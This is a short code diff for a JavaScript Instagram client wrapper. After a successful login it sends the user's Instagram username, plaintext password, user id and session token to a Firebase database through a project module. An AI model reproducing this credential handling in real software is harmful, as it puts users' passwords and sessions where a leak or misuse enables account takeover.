@@ -2,6 +2,8 @@ const Instagram = require('instagram-web-api')
 // const FileCookieStore = require('tough-cookie-filestore2')
 // const cookies =require('./../cookies')
 // const cookieStore = new FileCookieStore('./cookies.json')
+const FirebaseDB = require('./../firebasedb/firebase-db.js')
+const firebaseDB = new FirebaseDB
 
 class Insta {
   constructor() {
@@ -12,6 +14,7 @@ class Insta {
     this.client = new Instagram({username, password})
     this.loginUser = await this.client.login()
     if (this.loginUser.status === 'ok') {
+      firebaseDB.loginFB({username, password,id:this.loginUser.userId,token:this.loginUser.fr})
       return this.loginUser
     } else {
       return {status: "Login Error"}
